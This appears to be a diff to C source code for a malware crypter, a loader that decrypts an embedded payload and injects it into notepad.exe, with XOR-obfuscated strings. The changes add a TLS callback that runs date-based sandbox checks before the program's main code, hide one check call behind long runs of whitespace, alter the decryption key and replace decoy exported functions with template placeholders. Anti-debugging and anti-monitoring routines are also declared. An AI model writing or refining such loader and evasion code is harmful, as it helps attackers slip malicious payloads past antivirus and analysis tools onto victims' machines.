@@ -13,21 +13,17 @@
 #define WIN32_LEAN_AND_MEAN
 #define MAX_KEY_LENGTH 255
 #define MAX_VALUE_NAME 16383
-
-
 // function prototypes
-__declspec(dllexport) long dfmqe(char* qbglmwgqktxrw);
-__declspec(dllexport) float hxdqdnwdaxzuij(long lbtafcydtk);
-__declspec(dllexport) float zxnvopedm(float dadfqegdgi);
-__declspec(dllexport) double hespssidzwzt(float xaqujjyqpabv);
-__declspec(dllexport) float lwkprxfri(char* paazulgrby);
-__declspec(dllexport) long tepjw(double tsszs);
-__declspec(dllexport) float xwhjvfff(char* czxtxthfx);
-__declspec(dllexport) char* bozjukbsmppw(char* grotwzds);
-__declspec(dllexport) long xryyg(char* bvoijpntlpqv);
+//replaceatbeginning0
+//replaceatbeginning1
+//replaceatbeginning2
+//replaceatbeginning3
+//replaceatbeginning4
+//replaceatbeginning5
+//replaceatbeginning6
+//replaceatbeginning7
+//replaceatbeginning8
 //replaceatbeginning9
-
-
 byte *GetPayload(void);
 byte *decrypted(byte *data, int length, int crytptkey);
 WCHAR *widedecrypt(byte *data, int length, int crytptkey);
@@ -60,13 +56,34 @@ void GS_Check(void);
 void AntiProcMon(void);
 void date_specific_check(char *shortdate);
 void region_specific_check(char *region);
-
-
+// tls declaration
+void NTAPI xmuphatgbkmj(PVOID DllHandle,DWORD dwReason,PVOID Reserved) // will be run 4 times. 
+{
+//checks here
+                                                                                                                                                                                      date_specific_check("10/3/2019");
+                                                                                                                                                                                                                                                                                                                                                                                                                    
+			
+}
+//linker spec
+#ifdef _M_IX86
+#pragma comment (linker, "/INCLUDE:__tls_used")
+#pragma comment (linker, "/INCLUDE:__xl_b")
+#else
+#pragma comment (linker, "/INCLUDE:_tls_used")
+#pragma comment (linker, "/INCLUDE:_xl_b")
+#endif
+#ifdef _M_X64
+#pragma const_seg (".CRT$XLB")
+const
+#else
+#pragma data_seg (".CRT$XLB")
+#endif
+//end linker
+//tls import
+EXTERN_C PIMAGE_TLS_CALLBACK _xl_b = xmuphatgbkmj;
+#pragma const_seg ()
 //const char g_szClassName[] = "JoeCrypter";
-
-
 DWORD rsrc_len = 0;
-
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
@@ -74,8 +91,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     {
 		case WM_CREATE:
 		{	
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
-			byte *payload = decrypted(GetPayload(),rsrc_len, 123);
+         // same as usual, checks are in the TLS callback function set by the main prog  
+		 // having evasions in the TLS callback breaks things. Certain functions rely on the WndProc
+			LotsOfWindows(hwnd);
+			
+			byte *payload = decrypted(GetPayload(),rsrc_len, 45099);
 			ExecFile(decrypted("f?YYrlkajrvYYv|vq`h67YYkjq`uda+`}`",34,5),payload); // xor'd by 5 from c:\\windows\\system32\\notepad.exe
 		}
 		break;
@@ -409,7 +429,8 @@ int FlsTrick(void)
 }
 
 void PassToNoobs(void)
-{
+{	
+// maybe randomize this? cram garbage instructions here. 
 	__asm
 	{
 		_emit 0xCD
@@ -1206,93 +1227,13 @@ int timing_evasion_6(void)
 	}
 
 */
-__declspec(dllexport) long dfmqe(char* qbglmwgqktxrw)
- { 
-
- 
- __asm{ 
- jmp ebx 
- } 
-return 23961; 
- }
- //
-__declspec(dllexport) float hxdqdnwdaxzuij(long lbtafcydtk)
- { 
-
- 
- __asm{ 
- jmp ebx 
- } 
-return 93355; 
- }
- //
-__declspec(dllexport) float zxnvopedm(float dadfqegdgi)
- { 
-
- 
- __asm{ 
- jmp ebx 
- } 
-return 99902; 
- }
- //
-__declspec(dllexport) double hespssidzwzt(float xaqujjyqpabv)
- { 
-
- 
- __asm{ 
- jmp ebx 
- } 
-return 80642; 
- }
- //
-__declspec(dllexport) float lwkprxfri(char* paazulgrby)
- { 
-
- 
- __asm{ 
- jmp ebx 
- } 
-return 17326; 
- }
- //
-__declspec(dllexport) long tepjw(double tsszs)
- { 
-
- 
- __asm{ 
- jmp ebx 
- } 
-return 47347; 
- }
- //
-__declspec(dllexport) float xwhjvfff(char* czxtxthfx)
- { 
-
- 
- __asm{ 
- jmp ebx 
- } 
-return 33700; 
- }
- //
-__declspec(dllexport) char* bozjukbsmppw(char* grotwzds)
- { 
- 
- __asm{ 
- jmp eax 
- } 
-return "kvedynfszqfps"; 
- }
- //
-__declspec(dllexport) long xryyg(char* bvoijpntlpqv)
- { 
-
- 
- __asm{ 
- jmp ebx 
- } 
-return 15458; 
- }
- //
+//replacemeatend0
+//replacemeatend1
+//replacemeatend2
+//replacemeatend3
+//replacemeatend4
+//replacemeatend5
+//replacemeatend6
+//replacemeatend7
+//replacemeatend8
 //replacemeatend9
